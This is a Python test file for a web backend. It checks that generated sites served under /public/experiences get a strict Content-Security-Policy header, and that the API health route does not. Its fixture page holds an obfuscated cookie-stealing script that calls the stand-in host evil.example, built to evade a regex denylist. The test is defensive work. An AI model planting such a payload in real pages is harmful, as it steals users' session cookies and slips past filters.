"""test_public_csp.py — the RUNTIME security boundary (watcher denylist-evasion fix).

The static validator's regex is a denylist and denylists lose to obfuscation. The
actual boundary is the server-sent CSP header on /public/experiences: connect-src
'self' (same-origin progress sync only) + script-src 'self' (no inline/eval/remote),
browser-enforced and un-weakenable by the page. This test serves a site whose JS
tries remote egress and proves the served response still carries the strict CSP.

Run (venv): apps/band/chapterstage_backend/.venv/Scripts/python tests/test_public_csp.py
"""
from __future__ import annotations

import os
import sys
import tempfile
from pathlib import Path

_BACKEND = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_BACKEND))

_TMP = tempfile.TemporaryDirectory(ignore_cleanup_errors=True)
os.environ["DATABASE_URL"] = "sqlite+aiosqlite:///%s/test.db" % _TMP.name
_SITE = Path(_TMP.name) / "generated"
(_SITE / "exp1").mkdir(parents=True)
# a site that EVADES the validator's regex denylist (obfuscated fetch)
(_SITE / "exp1" / "index.html").write_text(
    "<!doctype html><html><body><script>"
    "window['fet'+'ch']('https://evil.example/x?c='+document.cookie)"
    "</script></body></html>", encoding="utf-8")
os.environ["GENERATED_SITE_ROOT"] = str(_SITE)
os.environ["CHAPTERSTAGE_ENV_FILE"] = _TMP.name + "/missing.env"
for _key in ("LLM_PROVIDER", "OLLAMA_MODEL", "OLLAMA_BASE_URL"):
    os.environ.pop(_key, None)

from fastapi.testclient import TestClient          # noqa: E402
from app.main import app                           # noqa: E402
from app.services.site_validator import STRICT_CSP_HEADER  # noqa: E402

FAILURES: list[str] = []
RAN: list[str] = []


def check(name, cond, receipt=""):
    RAN.append(name)
    print("  [%s] %s" % ("PASS" if cond else "FAIL", name))
    if receipt and not cond:
        print("         receipt: %s" % receipt)
    if not cond:
        FAILURES.append(name)


def main():
    print("test_public_csp.py — runtime CSP boundary on /public/experiences")
    with TestClient(app) as c:
        r = c.get("/public/experiences/exp1/index.html")
        csp = r.headers.get("content-security-policy", "")
        check("served experience returns 200", r.status_code == 200,
              receipt="status=%r" % r.status_code)
        check("strict CSP header is present and exact",
              csp == STRICT_CSP_HEADER, receipt="csp=%r" % csp)
        check("BOUNDARY connect-src 'self' (same-origin only)",
              "connect-src 'self'" in csp, receipt=csp)
        check("BOUNDARY script-src 'self' (no inline/eval/remote)",
              "script-src 'self'" in csp and "'unsafe-eval'" not in csp
              and "'unsafe-inline'" not in csp.split("style-src")[0], receipt=csp)
        check("nosniff + frame-deny hardening headers present",
              r.headers.get("x-content-type-options") == "nosniff"
              and r.headers.get("x-frame-options") == "DENY", receipt=dict(r.headers))
        # the evasive payload is STILL served (we don't sanitize content) — proof the
        # protection is the CSP boundary, not the regex.
        check("evasive JS is served verbatim — yet neutralized by CSP, not by scrub",
              "fet'+'ch" in r.text, receipt=r.text[:80])

        # NEGCONTROL: the strict CSP is SCOPED to /public — API responses don't get it
        # (so a missing header here would be a real misconfiguration, and a header on
        # /health would mean we can't tell the boundary apart from a blanket default).
        h = c.get("/api/v1/health")
        check("NEGCONTROL CSP boundary is scoped to /public (not on /api/health)",
              h.headers.get("content-security-policy") is None,
              receipt="api_csp=%r" % h.headers.get("content-security-policy"))

    print("%d/%d gate checks passed" % (len(RAN) - len(FAILURES), len(RAN)))
    if FAILURES:
        print("GATE FAIL: %s" % ", ".join(FAILURES))
        sys.exit(1)
    print("GATE PASS — the served CSP header is the boundary: remote egress is "
          "dead at the browser while same-origin progress sync remains possible.")
    sys.exit(0)


if __name__ == "__main__":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except AttributeError:
        pass
    main()
